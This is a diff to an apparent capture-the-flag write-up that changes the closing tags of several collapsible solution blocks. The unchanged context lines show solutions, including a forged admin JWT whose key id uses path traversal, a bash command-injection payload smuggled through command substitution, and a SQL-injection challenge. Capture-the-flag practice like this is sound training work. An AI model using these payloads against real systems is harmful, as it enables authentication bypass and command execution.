@@ -234,7 +234,7 @@ http://139.59.112.116/dddace4a-d619-4204-bb15-df6c0a24d6de/
 <p>
 They use this lib: https://github.com/jwt/ruby-jwt
 </p>
-</solution>
+</details>
 
 <details>
 <summary>Solution</summary>
@@ -252,7 +252,7 @@ var body = $@"{{""user"":""admin""}}";
 ```eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9tYWdpYyJ9.eyJ1c2VyIjoiYWRtaW4ifQ.KHvUjYMwH49GkMBB1FyyHJjX8J1kt79VAYadOpLDlMM```
 
 </p>
-</solution>
+</details>
 
 # 14. sqli and php password check
 http://139.59.127.147/e08720e1-df29-46cb-b1c8-83a32e9083df/
@@ -271,7 +271,7 @@ print(make_query(sql, password))
 ```
 
 </p>
-</solution>
+</details>
 
 # 15. bash injection
 http://139.59.127.148/ed932765-1a3a-467a-be5b-e11dc1fc542d/
@@ -283,7 +283,7 @@ http://139.59.127.148/ed932765-1a3a-467a-be5b-e11dc1fc542d/
 ```$( pwd | cut -c -9 )$( ls -S -r .. )```
 
 </p>
-</solution>
+</details>
 
 # 16. captcha madness with no repeating chars
 http://188.166.183.58/96e5c0bd-7f33-4188-94f0-89b3094bd6af/
